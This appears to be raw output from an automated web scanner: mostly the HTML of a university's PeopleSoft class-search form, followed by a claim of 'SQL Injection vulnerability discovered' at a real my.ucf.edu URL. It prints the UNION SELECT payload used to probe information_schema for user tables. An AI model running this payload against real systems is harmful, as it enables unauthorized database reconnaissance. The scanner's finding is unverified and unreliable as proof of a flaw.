+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$11"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$11" maxlength="50" name="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$11" style="width:184px; " tabindex="847" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td align="left" colspan="8" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$12"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$12" name="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$12" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:207px; " tabindex="907">
+<option value=""> </option>
+<option selected="selected" value="B">begins with</option>
+<option value="C">contains</option>
+<option value="E">is exactly</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="28"></td>
+<td align="right" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NMlbl$12"><span class="PSDROPDOWNLABEL">Textbook Author</span></div>
+</td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$12"><span class="PTTRANSPARENT" id="SSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$12">Textbook Author</span></div>
+</td>
+<td align="left" colspan="6" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$12"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$12" maxlength="50" name="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$12" style="width:184px; " tabindex="911" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td align="left" colspan="8" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$13"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$13" name="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$13" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:207px; " tabindex="971">
+<option value=""> </option>
+<option selected="selected" value="B">begins with</option>
+<option value="C">contains</option>
+<option value="E">is exactly</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="28"></td>
+<td align="right" rowspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NMlbl$13"><span class="PSDROPDOWNLABEL">Syllabus</span></div>
+</td>
+<td align="left" rowspan="16" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$13"><span class="PTTRANSPARENT" id="SSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$13">Syllabus</span></div>
+</td>
+<td align="left" colspan="6" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$13"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$13" maxlength="50" name="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$13" style="width:184px; " tabindex="975" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="1"></td>
+<td colspan="3"></td>
+<td align="left" colspan="11" nowrap="nowrap" rowspan="3" valign="top">
+<div id="win0divDERIVED_AS_LBL_ES_EXAMPLE_LBL2$14"><a href="javascript:submitAction_win0(document.win0,'DERIVED_AS_LBL_ES_EXAMPLE_LBL2$14');" id="DERIVED_AS_LBL_ES_EXAMPLE_LBL2$14" name="DERIVED_AS_LBL_ES_EXAMPLE_LBL2$14" onclick="javascript:MOpopupObj_win0.StopPopup(); cancelBubble(event);" role="button" tabindex="1008"><img alt="(example: 12345)" border="0" class="PSPUSHBUTTON_MO" id="DERIVED_AS_LBL_ES_EXAMPLE_LBL2$IMG$14" onkeydown="if (mouseoverHotkeyHandler(event)) MOpopupObj_win0.StartPopup('win0divDERIVED_AS_LBL_ES_EXAMPLE_LBL2$14', 'DERIVED_AS_LBL_ES_EXAMPLE_LBL2$14_14690_3144', 0, 0);" onmouseout="MOpopupObj_win0.StopPopup(); " onmouseover="MOpopupObj_win0.StartPopup('win0divDERIVED_AS_LBL_ES_EXAMPLE_LBL2$14', 'DERIVED_AS_LBL_ES_EXAMPLE_LBL2$14_14690_3144', 0, 0);" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PT_HELP_SWAN_1.gif" tabindex="1008"/></a></div>
+<div id="DERIVED_AS_LBL_ES_EXAMPLE_LBL2$14_14690_3144" style="display:none; position:absolute; max-width:400px; top:0; left:0;"><span class="PTPOPUP_MSGHDR" style="display:block;">example: 12345</span><br/>
+</div>
+</td>
+</tr>
+<tr>
+<td height="3"></td>
+<td rowspan="2"></td>
+<td align="left" colspan="2" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_CLASS_NBR$14"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_CLASS_NBR$14" maxlength="5" name="SSR_CLSRCH_WRK_CLASS_NBR$14" onchange="addchg_win0(this);return doEdits_win0(this,'S(5.0)','N','N','N','N','N','N',/^ *[0-9\,]*(\.[0-9\,]*)? *$/);" style="width:41px; text-align:right; " tabindex="1006" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="19"></td>
+<td align="right" colspan="6" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_CLASS_NBRlbl$14"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_CLASS_NBR$14" id="SSR_CLSRCH_WRK_CLASS_NBR_LBL$14">Class Nbr</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td rowspan="12"></td>
+<td align="left" colspan="10" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_UNITS_MIN_OPR$15"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_UNITS_MIN_OPR$15" name="SSR_CLSRCH_WRK_SSR_UNITS_MIN_OPR$15" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="1080">
+<option value=""> </option>
+<option value="GT">greater than</option>
+<option selected="selected" value="GE">greater than or equal to</option>
+<option value="E">is exactly</option>
+<option value="LT">less than</option>
+<option value="LE">less than or equal to</option>
+</select></div>
+</td>
+<td align="left" colspan="4" nowrap="nowrap" rowspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_UNITS_MINIMUM$15"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_UNITS_MINIMUM$15" maxlength="6" name="SSR_CLSRCH_WRK_UNITS_MINIMUM$15" onchange="addchg_win0(this);return doEdits_win0(this,'S(3.2)','N','N','N','N','N','N',/^ *[0-9\,]*(\.[0-9\,]*)? *$/);" style="width:56px; text-align:right; " tabindex="1081" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td align="right" colspan="2" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_UNITS_MINIMUMlbl$15"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_UNITS_MINIMUM$15" id="SSR_CLSRCH_WRK_UNITS_MINIMUM_LBL$15">Minimum Units</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td colspan="4" rowspan="3"></td>
+<td align="left" colspan="10" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_UNITS_MAX_OPR$15"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_UNITS_MAX_OPR$15" name="SSR_CLSRCH_WRK_SSR_UNITS_MAX_OPR$15" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="1082">
+<option value=""> </option>
+<option value="GT">greater than</option>
+<option value="GE">greater than or equal to</option>
+<option value="E">is exactly</option>
+<option value="LT">less than</option>
+<option selected="selected" value="LE">less than or equal to</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="22"></td>
+<td align="right" colspan="2" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_UNITS_MAXIMUMlbl$15"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_UNITS_MAXIMUM$15" id="SSR_CLSRCH_WRK_UNITS_MAXIMUM_LBL$15">Maximum Units</label></div>
+</td>
+<td align="left" colspan="4" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_UNITS_MAXIMUM$15"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_UNITS_MAXIMUM$15" maxlength="6" name="SSR_CLSRCH_WRK_UNITS_MAXIMUM$15" onchange="addchg_win0(this);return doEdits_win0(this,'S(3.2)','N','N','N','N','N','N',/^ *[0-9\,]*(\.[0-9\,]*)? *$/);" style="width:56px; text-align:right; " tabindex="1083" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td align="left" colspan="14" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_COMPONENT$16"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_COMPONENT$16" name="SSR_CLSRCH_WRK_SSR_COMPONENT$16" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="1148">
+<option selected="selected" value=""> </option>
+<option value="CLN">Clinical</option>
+<option value="CON">Continuance</option>
+<option value="DIS">Discussion</option>
+<option value="DRT">Dissertation</option>
+<option value="FLD">Field Studies</option>
+<option value="IND">Independent Study</option>
+<option value="INT">Internship</option>
+<option value="LAB">Laboratory</option>
+<option value="LEC">Lecture</option>
+<option value="MCL">Med-Clinical</option>
+<option value="MIS">Med-Independent Study</option>
+<option value="MLB">Med-Lab</option>
+<option value="MLC">Med-Lecture</option>
+<option value="MRS">Med-Research</option>
+<option value="MNT">Med_Internship</option>
+<option value="OTR">Other</option>
+<option value="PER">Performance</option>
+<option value="PRC">Practicum</option>
+<option value="RES">Research</option>
+<option value="RRP">Research/Report</option>
+<option value="SEM">Seminar</option>
+<option value="SUP">Supervision</option>
+<option value="THE">Thesis Research</option>
+<option value="TUT">Tutorial</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td align="right" colspan="5" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_COMPONENTlbl$16"><label class="PSDROPDOWNLABEL" for="SSR_CLSRCH_WRK_SSR_COMPONENT$16" id="SSR_CLSRCH_WRK_SSR_COMPONENT_LBL$16">Course Component</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td rowspan="5"></td>
+<td align="left" colspan="14" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SESSION_CODE$17"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SESSION_CODE$17" name="SSR_CLSRCH_WRK_SESSION_CODE$17" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="1180">
+<option selected="selected" value=""> </option>
+<option value="A">A - First Six Weeks</option>
+<option value="B">B - Second Six Weeks</option>
+<option value="C">C - Twelve Weeks</option>
+<option value="D">D - Eight Weeks</option>
+<option value="7W1">First Seven Week</option>
+<option value="4W4">Four Week - Fourth</option>
+<option value="MD1">Medical Year 1</option>
+<option value="MD2">Medical Year 2</option>
+<option value="MD3">Medical Year 3</option>
+<option value="MD4">Medical Year 4</option>
+<option value="MDY">Medical Year Session</option>
+<option value="1">Regular Academic Session</option>
+<option value="7W2">Second Seven Week</option>
+<option value="CM3">UCF Global Pathways</option>
+<option value="CM1">UCF Global Session I</option>
+<option value="CM2">UCF Global Session II</option>
+<option value="CM4">UCF Global Special</option>
+<option value="VAR">Variable Calendar</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="20"></td>
+<td align="right" colspan="5" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SESSION_CODElbl$17"><label class="PSDROPDOWNLABEL" for="SSR_CLSRCH_WRK_SESSION_CODE$17" id="SSR_CLSRCH_WRK_SESSION_CODE_LBL$17">Session</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td align="left" colspan="14" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_INSTRUCTION_MODE$18"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_INSTRUCTION_MODE$18" name="SSR_CLSRCH_WRK_INSTRUCTION_MODE$18" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="1277">
+<option selected="selected" value=""> </option>
+<option value="RA">Actve Lrng Reduce SeatTime(RA)</option>
+<option value="P">Face to Face (P)</option>
+<option value="RS">Limited Attendance (RS)</option>
+<option value="M">Mixed Mode (M)</option>
+<option value="V">Video (V)</option>
+<option value="RV">Video Str/ReducedSeatTime (RV)</option>
+<option value="V1">Video Strmng (V1) COVD DL exmp</option>
+<option value="WW">Web-Based (W)</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td align="right" colspan="5" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_INSTRUCTION_MODElbl$18"><label class="PSDROPDOWNLABEL" for="SSR_CLSRCH_WRK_INSTRUCTION_MODE$18" id="SSR_CLSRCH_WRK_INSTRUCTION_MODE_LBL$18">Mode of Instruction</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td rowspan="2"></td>
+<td align="left" colspan="13" rowspan="2" valign="top">
+<div id="win0divATTR_VAL$19"><select class="PSDROPDOWNLIST" id="ATTR_VAL$19" name="ATTR_VAL$19" size="1" style="width:228px; " tabindex="1358">
+<option selected="selected" value=""> </option>
+<option value="ACCOUNTING">Accounting, Dixon Schl of</option>
+<option value="AFRIC AMER">African American Studies</option>
+<option value="ROTCAIRFOR">Air Force ROTC</option>
+<option value="ANTHRO">Anthropology</option>
+<option value="ROTCARMY">Army ROTC</option>
+<option value="ATHL TRNG">Athletic Training</option>
+<option value="BIOLOGY">Biology</option>
+<option value="BCBS">Biomed Sciences, Burnett Schl</option>
+<option value="CARDIOPULM">Cardiopulmonary Sci</option>
+<option value="CHEMISTRY">Chemistry</option>
+<option value="CIVIL">Civil, Environ, &amp; Constr Engr</option>
+<option value="GRDSTUDIES">College of Graduate Studies</option>
+<option value="NSCM">Comm &amp; Media, Nicholson Schl</option>
+<option value="COMM DIS">Comm Sci &amp; Disorders, Schl of</option>
+<option value="COMP-ENGR">Computer Engineering</option>
+<option value="COMP SCI">Computer Science</option>
+<option value="CSLEDSCPSY">Counslr Educ &amp; Schl Psychology</option>
+<option value="CRIM JUST">Criminal Justice</option>
+<option value="DEANCAS">Dean's Office CAS</option>
+<option value="DEANCOHPA">Dean's Office COHPA</option>
+<option value="DEANEDUC">Dean's Office EDUC</option>
+<option value="DEANENG">Dean's Office ENGR</option>
+<option value="ECONOMICS">Economics</option>
+<option value="EDLDRHED">Ed Ldrshp &amp; Higher Education</option>
+<option value="EDUC STDS">Educational Studies</option>
+<option value="ELEC-ENGR">Electrical Engineering</option>
+<option value="EE/CE">Electrical Engr &amp; Comp Sci</option>
+<option value="CORE">Engineering Core</option>
+<option value="TECHNOLOGY">Engineering Technology</option>
+<option value="ENGLISH">English</option>
+<option value="FINANCE">Finance</option>
+<option value="HIM">Health Info Mgmt</option>
+<option value="HLTH SCI">Health Sciences</option>
+<option value="HEALTHSERV">Health Services Admin</option>
+<option value="HISTORY">History</option>
+<option value="HOSP MANG">Hospitality Operations</option>
+<option value="IEMS">Industrial Engr &amp; Mgmt Sys</option>
+<option value="IDS-CAS">Interdisciplinary CAS</option>
+<option value="IDS-COHPA">Interdisciplinary COHPA</option>
+<option value="JUDAIC STS">Judaic Studies</option>
+<option value="KNSLGY-PT">Kinesiology&amp;Phys Thpy, Schl of</option>
+<option value="LRNEDRSCH">Learning Sci &amp; Educ Research</option>
+<option value="LEGAL ST">Legal Studies</option>
+<option value="MANAGEMENT">Management</option>
+<option value="MARKETING">Marketing</option>
+<option value="MSE">Materials Sci &amp; Engineering</option>
+<option value="MATH">Mathematics</option>
+<option value="MECH/AERO">Mechanical &amp; Aerospace Engr</option>
+<option value="MIS">Mgmt Info Systems</option>
+<option value="SMST">Mod, Sim &amp; Trng, School of</option>
+<option value="FOR LANG">Modern Languages</option>
+<option value="MICRO">Molecular Biology &amp; Micro</option>
+<option value="NURSING">Nursing</option>
+<option value="LIBERAL ST">Office of Interdisc Studies</option>
+<option value="OPTICS">Optics and Photonics</option>
+<option value="PERFMGARTS">Performing Arts, Schl of</option>
+<option value="PHILOSOPHY">Philosophy</option>
+<option value="PT">Physical Therapy</option>
+<option value="PHYSICS">Physics</option>
+<option value="POL SCI">Pol, Scty &amp; Intl Afrs, Schl of</option>
+<option value="PSYCHOLOGY">Psychology</option>
+<option value="PUB ADM">Public Administration, Schl of</option>
+<option value="PUB AFF">Public Affairs PhD</option>
+<option value="RADSCI">Radiological Sciences</option>
+<option value="SOC WORK">Social Work, Schl of</option>
+<option value="SOCIOLOGY">Sociology</option>
+<option value="SOC/ANTHRO">Sociology &amp; Anthropology</option>
+<option value="STATISTICS">Statistics &amp; Data Science</option>
+<option value="TCHREDUC">Teacher Education, Schl of</option>
+<option value="TOURATTEVT">Tourism, Events and Attraction</option>
+<option value="VISARTDES">Visual Arts &amp; Design, Schl of</option>
+<option value="WOMENS ST">Womens Studies</option>
+<option value="WRITE RHET">Writing and Rhetoric</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="12"></td>
+<td align="right" colspan="6" valign="top">
+<div id="win0divATTR_VALlbl$19"><label class="PSDROPDOWNLABEL" for="ATTR_VAL$19" id="ATTR_VAL_LBL$19">Department</label></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="3" height="3"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="3" height="9"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="5" height="4"></td>
+</tr>
+<tr>
+<td height="18"></td>
+<td align="left" valign="top">
+<div id="win0div$ICField183">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="715">
+<tr>
+<td width="713">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="3" id="ACE_$ICField183" role="presentation" style="border-style:none" width="713">
+<tr>
+<td height="0" width="417"></td>
+<td width="140"></td>
+<td width="156"></td>
+</tr>
+<tr>
+<td height="13"></td>
+<td align="left" nowrap="nowrap" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_SSR_PB_CLEAR"><a class="PSPUSHBUTTON Left" role="presentation"><span style="background-Color: transparent;"><input class="PSPUSHBUTTON" id="CLASS_SRCH_WRK2_SSR_PB_CLEAR" name="CLASS_SRCH_WRK2_SSR_PB_CLEAR" onclick="submitAction_win0(document.win0,this.id,event);" style="width:110px; " tabindex="1393" title="Clear Criteria" type="button" value="Clear"/></span></a></div>
+</td>
+<td align="left" nowrap="nowrap" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_SSR_PB_CLASS_SRCH"><a class="PSPUSHBUTTON Left" role="presentation"><span style="background-Color: transparent;"><input class="PSPUSHBUTTON" id="CLASS_SRCH_WRK2_SSR_PB_CLASS_SRCH" name="CLASS_SRCH_WRK2_SSR_PB_CLASS_SRCH" onclick="submitAction_win0(document.win0,this.id,event);" style="width:114px; " tabindex="1394" type="button" value="Search"/></span></a></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="5" height="2"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="7" height="10"></td>
+</tr>
+<tr>
+<td colspan="2" height="43"></td>
+<td align="left" colspan="5" nowrap="nowrap" valign="top">
+<div id="win0divFX_CLSSRCH_DER_FLAG"><input id="FX_CLSSRCH_DER_FLAG$chk" name="FX_CLSSRCH_DER_FLAG$chk" type="hidden" value="N"/><input class="PSCHECKBOX" id="FX_CLSSRCH_DER_FLAG" name="FX_CLSSRCH_DER_FLAG" onclick="setupTimeout2();    this.form.FX_CLSSRCH_DER_FLAG$chk.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="1397" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="FX_CLSSRCH_DER_FLAG" id="FX_CLSSRCH_DER_FLAG_LBL">Verify Search</label></div>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<a id="ICLastAnchor_win0" name="ICLastAnchor_win0"></a> <!-- Embedded Help popup Begin -->
+<div id="HelppopupDiv_win0" style="display:none; position:absolute; top:0; left:0">t</div>
+<div class="popupDragFrame" id="HelpDragFrame_win0"> </div>
+<table border="0" cellpadding="0" cellspacing="0" id="HelppopupContainer_win0" style="opacity:1; display:none; position:absolute; top:0; left:0" width="20">
+<tr>
+<td align="left" class="HelppopupInner" id="HelppopupInner_win0" style="position:absolute;z-Index:302;" valign="top">
+<div class="PTPOPUP_HEADER HelppopupTitleBar" id="HelppopupTitleBar_win0" style="width:341px">
+<div class="HelppopupTitleBarMiddle" dir="ltr" id="HelppopupTitleBarMiddle_win0" style="width:333px">
+<table>
+<tr>
+<td id="HelppopupTitle_win0" style="width:290px; cursor: move;"><span class="PTPOPUP_TITLE">Help</span></td>
+<td style="width:45px"><img align="right" alt="Close" id="#HELPPOPUPCLOSE" onclick='HelppopupObj_win0.StopPopup("win0");' onkeypress="var kC=keyPressHandler(event); if (kC==13 || kC==32) HelppopupObj_win0.StopPopup('win0');" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PT_PORTAL_IC_CLOSE_1.gif" style="cursor:pointer" tabindex="0" title="Close"/></td>
+</tr>
+</table>
+</div>
+</div>
+<div class="MOBGImage HelpdivpopupFrame" id="HelpdivpopupFrame_win0" onclick="HelppopupObj_win0.SetFocusFlag(false);" style="border: 1px #bcbaba solid; padding:12px; overflow:auto;" tabindex="-1">test</div>
+<div class="popupShadow" id="HelppopupShadow" style="position:absolute;z-index:-1;">
+<div class="popupShadowTopRightCorner" id="HelppopupShadowTopRightCorner" style="height:10px;"> </div>
+<div class="popupShadowTop" id="HelppopupShadowTop"> </div>
+<div class="popupShadowBottom" id="HelppopupShadowBottom" style="height:10px">
+<div class="popupShadowBottomLeftCorner" id="HelppopupShadowBottomLeftCorner" style="height:10px;width:10px"> </div>
+<div class="popupShadowBottomMiddle" id="HelppopupShadowBottomMiddle" style="height:10px;"> </div>
+<div class="popupShadowBottomRightCorner" id="HelppopupShadowBottomRightCorner" style="height:10px;width:10px"> </div>
+</div>
+</div>
+</td>
+</tr>
+</table>
+<!-- Embedded Help popup End  -->
+<div id="pt_fakeBC" style="display:none">
+<ul>
+<li class="pthnavhiearchysep pthbcdispiblock"> </li>
+<li class="pthnavbarcref ptabncrefbc ptfakercfbc pthbcdispiblock" id="pthnavbccref_PT_FAKE_CLASS_SEARCH_GBL"><a class="abnanchor" href="https://csprod-ss.net.ucf.edu/psc/CSPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501&amp;PortalRegistryName=GUEST&amp;PortalServletURI=https%3a%2f%2fmy.ucf.edu%2fpsp%2fIHPROD%2f&amp;PortalURI=https%3a%2f%2fmy.ucf.edu%2fpsc%2fIHPROD%2f&amp;PortalHostNode=EMPL&amp;NoCrumbs=yes" id="pthnavbccrefanc_CLASS_SEARCH_GBL" role="menuitem" target="TargetContent">View Schedule of Classes</a>
+<div class="pthnavcrefimg"> </div>
+</li>
+</ul>
+</div>
+</form>
+
+
+
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+***** SQL Injection vulnerability discovered in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501 in the following form *****
+
+ Script used --> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+<form action="https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL" autocomplete="off" class="PSForm" id="CLASS_SEARCH" method="post" name="win0">
+<div class="ps_box-toolshiddens" id="win0divPSTOOLSHIDDENS">
+<div class="ps_modalmask_cover psc_hidden" id="pt_modalMaskCover"> </div>
+<div class="ps_modalmask psc_hidden" id="pt_modalMask"> </div>
+<div class="PSMODAL" id="pt_modals">
+<div class="popupDragFrame" id="ptModalShadow" style="cursor:nw-resize"> </div>
+</div>
+<div class="ps_typeahead psc_hidden" id="pt_typeahead0"><span class="spanTextDropdown" id="pt_typeahead"> </span></div>
+<div id="WAIT_win0" style="display:none;position:absolute;right:0;"><img align="left" alt="Processing... please wait" id="processing" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PT_PROCESSING_1.gif" title="Processing... please wait"/></div>
+<div aria-atomic="true" aria-live="assertive" aria-relevant="text additions" class="psc_processing psc_hidden" id="Delayed_win0" style="visibility:hidden; display:none; position:absolute;left:-10000px;top:auto; width:1px; height:1px;overflow:hidden;"> </div>
+<div id="SAVED_win0" style="display:none;position:absolute;right:0;">
+<table border="0" cellpadding="0" cellspacing="0">
+<tr>
+<td><img alt="" border="0" height="39" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PTPORTAL_POPBOX_LEFT_1.gif" width="7"/></td>
+<td align="center" background="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PTPORTAL_POPBOX_CENTER_1.gif" id="saveWait_win0" valign="middle" width="35"><img alt="" height="24" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PT_LOADER_1.gif" width="24"/></td>
+<td background="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PTPORTAL_POPBOX_CENTER_1.gif" nowrap="nowrap"><span class="PSPROCESSING" dir="ltr" id="ptStatusText_win0"> </span></td>
+<td><img alt="" height="39" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PTPORTAL_POPBOX_RIGHT_1.gif" width="6"/></td>
+<td> </td>
+</tr>
+</table>
+</div>
+<div class="x" id="win0divPSHIDDENFIELDS" style="display:none"><input id="ICType" name="ICType" type="hidden" value="Panel"/><input id="ICElementNum" name="ICElementNum" type="hidden" value="0"/><input id="ICStateNum" name="ICStateNum" type="hidden" value="9"/><input id="ICAction" name="ICAction" type="hidden" value="None"/><input id="ICModelCancel" name="ICModelCancel" type="hidden" value="0"/><input id="ICXPos" name="ICXPos" type="hidden" value="0"/><input id="ICYPos" name="ICYPos" type="hidden" value="0"/><input id="ResponsetoDiffFrame" name="ResponsetoDiffFrame" type="hidden" value="-1"/><input id="TargetFrameName" name="TargetFrameName" type="hidden" value="None"/><input id="FacetPath" name="FacetPath" type="hidden" value="None"/><input id="ICFocus" name="ICFocus" type="hidden" value=""/><input id="ICSaveWarningFilter" name="ICSaveWarningFilter" type="hidden" value="0"/><input id="ICChanged" name="ICChanged" type="hidden" value="-1"/><input id="ICSkipPending" name="ICSkipPending" type="hidden" value="0"/><input id="ICAutoSave" name="ICAutoSave" type="hidden" value="0"/><input id="ICResubmit" name="ICResubmit" type="hidden" value="0"/><input id="ICSID" name="ICSID" type="hidden" value="xzKAljBrDFdwgnNk2VF4+CvxMXq8IgdoMcSNIPHPO/k="/><input id="ICActionPrompt" name="ICActionPrompt" type="hidden" value="false"/><input id="ICBcDomData" name="ICBcDomData" type="hidden" value=""/><input id="ICPanelName" name="ICPanelName" type="hidden" value=""/><input id="ICFind" name="ICFind" type="hidden" value=""/><input 